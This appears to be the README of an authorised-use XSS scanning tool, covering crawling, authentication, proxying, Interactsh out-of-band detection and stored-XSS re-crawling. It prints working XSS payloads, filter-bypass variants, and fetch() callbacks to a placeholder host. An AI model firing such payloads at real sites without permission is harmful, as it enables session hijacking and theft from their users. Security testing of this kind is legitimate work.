# XSS Tester

An async, Playwright-based XSS scanning tool with support for authentication,
proxying, out-of-band (OOB) detection via Interactsh, and rich console output.

> **Legal notice** — Only use this tool against systems you own or have explicit
> written authorisation to test.

---

## Features

| Feature | Details |
|---|---|
| Crawling | BFS spider with configurable depth and page limits |
| SPA support | Waits for `networkidle` before scraping each page |
| Redirect following | Follows same-domain server redirects and captures GET params added by the redirect |
| Input discovery | Form inputs, standalone inputs, URL query parameters (from crawled pages, redirects, and discovered links) |
| Detection | Alert dialogs · DOM mutation (`window.__xss`) · Interactsh OOB · Stored XSS re-crawl |
| Selective disabling | Any detection method can be disabled individually |
| Authentication | Form-based JSON script · raw cookie string |
| Proxy | Pass-through to Burp / mitmproxy with TLS bypass |
| Reporting | Live rich console output + JSON report file |
| Concurrency | Semaphore-gated parallel injection tasks |
| OOB threading | Interactsh wait + poll runs in a background thread; SIGINT aborts the wait early |
| Graceful exit | CTRL+C saves partial findings before quitting |

---

## Setup

```bash
# 1. Install Python dependencies (using uv)
uv sync

# 2. Install the Playwright Chromium browser
uv run playwright install chromium

# Or run setup.sh which does both steps:
bash setup.sh
```

Dependencies are declared in `pyproject.toml`. The `cryptography` package is
required for Interactsh OOB support (RSA key-pair generation and AES-256-CFB
decryption of server callbacks).

---

## Quick Start

```bash
# Unauthenticated scan
uv run python main.py --base-url https://target.com

# With a login script
uv run python main.py --base-url https://target.com --auth-script auth.json

# Through Burp Suite
uv run python main.py --base-url https://target.com --proxy http://127.0.0.1:8080

# OOB detection only (suppress alert/DOM noise)
uv run python main.py --base-url https://target.com \
  --interactsh-url https://oast.live \
  --disable-detection alert-dialog dom-mutation

# With stored XSS detection
uv run python main.py --base-url https://target.com --re-crawl

# Full example
uv run python main.py \
  --base-url https://target.com \
  --auth-script auth.json \
  --proxy http://127.0.0.1:8080 \
  --interactsh-url https://oast.live \
  --oob-wait 20 \
  --max-pages 200 \
  --max-depth 5 \
  --delay 0.5 \
  --concurrency 5 \
  --output findings.json \
  --scope /app/ \
  --verbose
```

---

## CLI Reference

```
usage: xss-tester [-h] --base-url URL [--scope PATH]
                  [--auth-script FILE] [--cookies STRING]
                  [--proxy URL] [--proxy-ca FILE]
                  [--interactsh-url URL] [--payloads FILE]
                  [--oob-wait SECS] [--disable-detection METHOD [METHOD ...]]
                  [--re-crawl]
                  [--max-pages N] [--max-depth N] [--delay SECS] [--concurrency N]
                  [--output FILE] [--verbose]
                  [--headless | --no-headless]
```

| Flag | Default | Description |
|---|---|---|
| `--base-url` | *(required)* | Starting URL |
| `--scope` | — | Restrict crawl to this path prefix (e.g. `/app/`) |
| `--auth-script` | — | Path to JSON login-flow descriptor |
| `--cookies` | — | Raw cookie string (`name=val; name2=val2`) |
| `--proxy` | — | HTTP proxy URL |
| `--proxy-ca` | — | Custom CA cert path (see note below) |
| `--interactsh-url` | — | Interactsh server URL for OOB detection |
| `--payloads` | `payloads.txt` | Newline-delimited payload file |
| `--oob-wait` | `15` | Seconds to wait after all injections before polling Interactsh for callbacks |
| `--disable-detection` | — | Disable one or more detection methods: `alert-dialog`, `dom-mutation`, `interactsh-oob` |
| `--re-crawl` | off | After injection, re-visit every crawled page to detect stored XSS |
| `--max-pages` | `100` | Maximum pages to crawl |
| `--max-depth` | `3` | Maximum BFS depth |
| `--delay` | `0` | Seconds to sleep between requests |
| `--concurrency` | `3` | Max concurrent browser pages |
| `--output` | `findings.json` | JSON report output path |
| `--verbose` | off | Enable DEBUG logging |
| `--headless` / `--no-headless` | headless | Show/hide browser UI |

---

## Authentication

### Form-based login (--auth-script)

Create a JSON file describing the login page:

```json
{
  "login_url": "https://target.com/login",
  "username_selector": "#username",
  "password_selector": "#password",
  "username": "testuser",
  "password": "testpass",
  "submit_selector": "[type=submit]",
  "success_indicator": ".dashboard"
}
```

| Key | Required | Description |
|---|---|---|
| `login_url` | Yes | Full URL of the login page |
| `username_selector` | Yes | CSS selector for the username field |
| `password_selector` | Yes | CSS selector for the password field |
| `username` | Yes | Username / email to use |
| `password` | Yes | Password to use |
| `submit_selector` | Yes | CSS selector for the submit button |
| `success_indicator` | No | CSS selector expected **after** login (e.g. `.dashboard`). Used to verify success; scan continues even if absent. |

After login the Playwright storage state (cookies + localStorage) is saved to
`.auth_state.json` and reused for all subsequent browser contexts.  The tool
also detects session expiry (redirect back to `login_url`) and automatically
re-authenticates.

### Cookie injection (--cookies)

If you already have a valid session cookie, pass it directly:

```bash
python main.py --base-url https://target.com \
               --cookies "session=abc123; csrftoken=xyz987"
```

---

## Proxy and TLS

```bash
# Burp Suite (TLS errors suppressed automatically)
python main.py --base-url https://target.com --proxy http://127.0.0.1:8080

# With a custom CA certificate
python main.py --base-url https://target.com \
               --proxy http://127.0.0.1:8080 \
               --proxy-ca ~/burp_ca.der
```

> **Note on `--proxy-ca`:** Playwright/Chromium does not support injecting CA
> certificates programmatically.  When `--proxy` is set (with or without
> `--proxy-ca`), TLS verification is disabled via `ignore_https_errors=True`.
> For strict TLS without disabling verification, install the CA certificate to
> your **system trust store** (e.g. `update-ca-certificates` on Debian/Ubuntu,
> or Keychain Access on macOS) — Chromium will then trust it natively.

---

## Interactsh OOB Detection

Out-of-band (OOB) detection catches payloads that execute asynchronously or
in contexts where dialog-based detection fails (e.g. stored XSS viewed by a
different session, blind sinks, or CSP that blocks `alert`).

```bash
python main.py --base-url https://target.com \
               --interactsh-url https://oast.live
```

### How it works

1. The tool registers with the Interactsh server, generating an RSA-2048 key
   pair and a 20-character correlation ID.
2. For each injection attempt, a unique 13-character nonce is generated and
   embedded in the payload as a subdomain:
   `{correlation_id}{nonce}.oast.live`
3. All injections complete first.  A background OS thread is then started to
   handle the OOB wait and poll.  The event loop stays responsive during the
   wait (SIGINT will abort the sweep early).  After `--oob-wait` seconds
   (default 15 s) the thread polls the server once for all callbacks.
4. Interactions are decrypted (RSA-OAEP-SHA256 wraps an AES-256-CFB key) and
   correlated to the originating injection point via the nonce.
5. Each confirmed OOB callback is reported with method `interactsh-oob`.

### OOB payloads

OOB payloads **must cause JavaScript execution** to prove XSS — simple resource
loads (`<img src>`, `<video src>`) do not demonstrate script injection.  All
OOB payloads in `payloads.txt` use `fetch()` inside a script tag or event
handler:

```
<script>fetch("//INTERACTSH_HOST")</script>
<img src=x onerror="fetch('//INTERACTSH_HOST')">
<svg onload="fetch('//INTERACTSH_HOST')">
```

The string `INTERACTSH_HOST` is automatically replaced with the per-test
subdomain when `--interactsh-url` is configured; payloads without this string
are injected unchanged.

---

## Detection Methods

Four methods are available; the first three run during injection and the fourth
runs as a separate re-crawl pass.

1. **`alert-dialog`** — A `page.on('dialog')` handler catches any JavaScript
   `alert()` / `confirm()` / `prompt()` triggered by the payload.

2. **`dom-mutation`** — After injection the tool evaluates
   `window.__xss === true` in the page context.  Payloads in `payloads.txt`
   that use `onerror`, `onload`, etc. to set this flag are caught here without
   producing a visible dialog.

3. **`interactsh-oob`** — Each injection embeds a unique subdomain in OOB
   payloads.  After all injections are complete, the tool waits `--oob-wait`
   seconds then polls the Interactsh server once, correlating any callbacks
   to their originating injection point.

4. **`stored:alert-dialog` / `stored:dom-mutation`** — Enabled with
   `--re-crawl`.  After injection, every crawled page is visited again without
   injecting anything.  XSS that fires on this second visit was persisted
   server-side (stored XSS).  Findings are prefixed with `stored:` in the
   report to distinguish them from reflected findings.

### Disabling detection methods

Use `--disable-detection` to suppress one or more methods:

```bash
# Only use OOB detection (useful for blind/stored XSS hunting)
python main.py --base-url https://target.com \
               --interactsh-url https://oast.live \
               --disable-detection alert-dialog dom-mutation

# Suppress alert dialogs only (keeps dom-mutation + OOB)
python main.py --base-url https://target.com \
               --disable-detection alert-dialog
```

---

## Stored XSS Detection (--re-crawl)

Reflected XSS is detected at injection time.  Stored XSS requires a second
pass — the payload is persisted by the server during injection, then executed
when any user (or the scanner itself) loads the page where it is displayed.

```bash
python main.py --base-url https://target.com --re-crawl
```

### How it works

1. All payloads are injected across every discovered input and URL parameter
   (the normal test phase).
2. Immediately after injection, every previously crawled page is visited again
   without injecting anything — the scanner is acting as a second browser
   session loading stored content.
3. Each re-visited page is checked for `alert-dialog` and `dom-mutation`
   triggers via the same detection logic used during injection.
4. Findings are tagged `stored:alert-dialog` or `stored:dom-mutation` in the
   JSON report so they are distinguishable from reflected XSS findings.

### Timing

The re-crawl runs concurrently with the OOB background thread's wait period,
making productive use of what would otherwise be dead time.  For targets with
long processing pipelines (e.g. email rendering, async queues), add extra time
via `--oob-wait`:

```bash
python main.py --base-url https://target.com \
               --re-crawl \
               --interactsh-url https://oast.live \
               --oob-wait 60
```

### Stored XSS in the JSON report

```json
{
  "url": "https://target.com/comments",
  "parameter": "(stored)",
  "payload": "(stored — injected during test phase)",
  "detection_method": "stored:dom-mutation",
  "test_id": "g4k2m9x1p3a7b",
  "timestamp": "2024-01-15T10:35:12.000000+00:00",
  "severity": "High"
}
```

---

## GET Parameter Discovery

The spider discovers GET parameters from three sources:

1. **The final (post-redirect) URL** — Playwright follows server-side
   redirects automatically.  The spider reads `page.url` after navigation, so
   parameters added by the redirect (e.g. a page at `/level19.php` that
   redirects to `/level19.php?q=foo&tr=...`) are captured from the landing
   URL, not the original queue URL.  Redirects that leave the target domain
   are skipped.

2. **The crawled page's own URL** — if a page is visited at
   `/search?q=hello`, the `q` parameter is extracted immediately.

3. **Links found on the page** — every `<a href>` and `<form action>` with
   query parameters is also scanned.  This means parameters like `?id=` in
   linked URLs are discovered and tested even if those pages are never crawled
   (e.g. due to `--max-pages` or `--max-depth` limits).

Parameters are deduplicated by `(endpoint path, param name)` so the same
parameter is only tested once per endpoint, regardless of how many different
link values are observed.  The final URL (after any redirect) is also added to
the visited set so it is not re-crawled if another link points to it directly.

---

## Payload File Format

`payloads.txt` is a plain-text file: one payload per line.  Lines starting
with `#` and blank lines are ignored.

The bundled file ships with 104 payloads covering:

| Category | Examples |
|---|---|
| Basic script injection | `<script>alert(document.domain)</script>` |
| DOM mutation probes | `<img src=x onerror="window.__xss=true">` |
| Event-handler alerts | `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>` |
| Attribute-context breakouts | `"><script>...`, `" onmouseover="alert(1)` |
| Space-filter bypass | `"autofocus/onfocus="alert(document.domain)` |
| JS string context breakouts | `';alert(document.domain);`, `\';alert(document.domain);//` |
| `alert` keyword filter bypasses | base36/base30 `this[N..toString(36)](document.domain)` |
| `confirm`/`prompt` alternatives | `"autofocus/onfocus="confirm\`document.domain\`` |
| Function-override injection | `");function log_access(url){setTimeout('alert(document.domain)',0)}//` |
| JavaScript protocol | `javascript:alert(document.domain)` |
| Template/expression contexts | `{{constructor.constructor('alert(1)')()}}` |
| Filter-bypass variants | HTML entity, Unicode escape, `eval(atob(...))` |
| Tag/attribute mutation | `</title><script>...`, `</textarea><script>...` |
| Polyglots | Combined context-agnostic payloads |
| OOB callbacks | `<script>fetch("//INTERACTSH_HOST")</script>` |

```
# Basic alert
<script>alert(1)</script>

# DOM mutation (silent — sets window.__xss)
<img src=x onerror="window.__xss=true">

# Attribute breakout
"><img src=x onerror=alert(1)>

# JS string context breakout
';alert(document.domain);

# OOB — INTERACTSH_HOST is replaced at runtime with the per-test subdomain
<script>fetch("//INTERACTSH_HOST")</script>
```

---

## Output

### Live console

Findings are printed immediately as they are discovered:

```
 VULN  https://target.com/search  param=q  via=alert-dialog  id=a3f9c1d2e4b5
```

### JSON report

```json
[
  {
    "url": "https://target.com/search",
    "parameter": "q",
    "payload": "<script>alert(1)</script>",
    "detection_method": "alert-dialog",
    "test_id": "a3f9c1d2e4b5",
    "timestamp": "2024-01-15T10:30:00.123456+00:00",
    "severity": "High"
  }
]
```

### Summary

```
╭─ Scan Summary ──────────────────────────────╮
│ Metric                  Value               │
│ Pages crawled              42               │
│ Inputs tested            1260               │
│ Findings                    3               │
╰─────────────────────────────────────────────╯
```

---

## Project Structure

```
xss-tester/
├── main.py              # CLI entry point and orchestration
├── Auth/
│   ├── __init__.py
│   └── Manager.py       # AuthConfig dataclass and AuthManager
├── Interactsh/
│   ├── __init__.py
│   └── Client.py        # InteractshClient (RSA registration, AES poll)
├── Models/
│   ├── __init__.py
│   ├── Finding.py       # Finding dataclass
│   └── Spider.py        # InputField, UrlParam, PageData dataclasses
├── Reporter/
│   ├── __init__.py
│   └── Reporter.py      # Console output and JSON report writer
├── Spider/
│   ├── __init__.py
│   └── Spider.py        # Async BFS crawler and input/param discovery
├── Tester/
│   ├── __init__.py
│   └── Tester.py        # Payload injection, stored XSS re-crawl, OOB sweep
├── payloads.txt         # XSS payload library (104 payloads)
├── pyproject.toml       # Project metadata and dependencies
├── requirements.txt     # Legacy pip requirements (prefer uv sync)
├── setup.sh             # Convenience script: uv sync + playwright install
├── uv.lock              # Locked dependency versions
├── .gitignore
└── README.md            # This file
```

---

## Extending the Tool

The codebase is organised as Python packages; each module has a single
responsibility and a clean public API re-exported from its `__init__.py`.

- **New payload types** — Add lines to `payloads.txt`.  Payloads containing
  the string `INTERACTSH_HOST` have it automatically replaced with a live
  per-test OOB subdomain when `--interactsh-url` is configured.  OOB payloads
  must use JavaScript (e.g. `fetch()`) to prove script execution.

- **New detection methods** — Add a check to `XSSTester._detect()` in
  `Tester/Tester.py`.  It receives the `Page`, the `dialog_triggered` flag,
  and the `test_id`.

- **New auth flows** — Extend `AuthManager._do_login()` in `Auth/Manager.py`
  to support OAuth, MFA, SAML, etc.

- **New input types** — Extend `Spider._extract_inputs()` in `Spider/Spider.py`
  to discover additional element types (e.g. `contenteditable` divs, custom
  web components).

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `Payloads file not found` | Ensure `payloads.txt` is in the working directory or pass `--payloads /path/to/file` |
| TLS errors with proxy | The tool auto-applies `ignore_https_errors` when `--proxy` is set |
| No pages discovered | Check `--base-url` and `--scope`; use `--no-headless` to watch the browser |
| Login fails | Use `--no-headless --verbose` to observe and debug the login flow |
| OOB not detecting | Confirm `--interactsh-url` is reachable; the target server must be able to make outbound HTTP/DNS requests; increase `--oob-wait` if the target is slow |
| OOB registration fails | Ensure the `cryptography` package is installed (`uv sync`) |
| Few GET params found | Increase `--max-pages` and `--max-depth`; the spider harvests params from redirects and discovered links, so more crawl coverage yields more params |
| Redirect params not tested | Use `--verbose` to confirm redirects are logged (`Redirect followed: ...`); ensure the final URL stays on the same domain/scope |
| Stored XSS not detected | Ensure `--re-crawl` is set; increase `--oob-wait` if the server processes input asynchronously before displaying it |
